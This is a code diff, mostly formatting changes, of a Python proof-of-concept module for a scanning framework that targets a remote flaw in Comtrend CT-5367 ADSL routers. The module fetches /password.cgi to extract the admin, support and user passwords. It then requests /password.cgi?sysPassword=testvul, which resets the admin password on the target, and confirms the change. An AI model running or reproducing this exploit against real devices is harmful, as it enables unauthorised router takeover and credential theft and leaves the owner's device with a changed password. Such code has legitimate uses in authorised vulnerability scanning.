@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Comtrend_0001' # 平台漏洞编号，留空
+    vuln_id = 'Comtrend_0001'  # 平台漏洞编号，留空
     name = '康全电讯 ADSL Router 远程代码执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2011-03-04'  # 漏洞公布时间
     desc = '''
         康全电讯 ADSL Router CT-5367 C01_R12 - 函数参数过滤不严谨导致 Remote Code Execution.
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Comtrend Router'  # 漏洞应用名称
     product_version = 'CT-5367 C01_R12'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'a5654a28-e48f-4388-8948-4ed6fe619408'
@@ -32,12 +34,13 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             payload = self.target + '/password.cgi'
             code, head, res, err, _ = hh.http(payload)
             if code == 200:
-                m = re.search(r"pwdAdmin = '[\S]*';\s*pwdSupport = '[\S]*';\s*pwdUser = '[\S]*';", res)
+                m = re.search(
+                    r"pwdAdmin = '[\S]*';\s*pwdSupport = '[\S]*';\s*pwdUser = '[\S]*';", res)
                 if m:
                     #security_hole('find administrator password on telnet: ' + m.group(0));
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -45,7 +48,7 @@ class Poc(ABPoc):
 
             payload_change_pass = '/password.cgi?sysPassword=testvul'
             payload = self.target + payload_change_pass
-            code, head, res, err, _  = hh.http(payload)
+            code, head, res, err, _ = hh.http(payload)
             if code == 200 and "pwdAdmin = 'testvul'" in res:
                 #security_hole('password change vulnerable: '+ arg + 'password.cgi?sysPassword=rootpass&sptPassword=supportpass')
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -56,6 +59,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
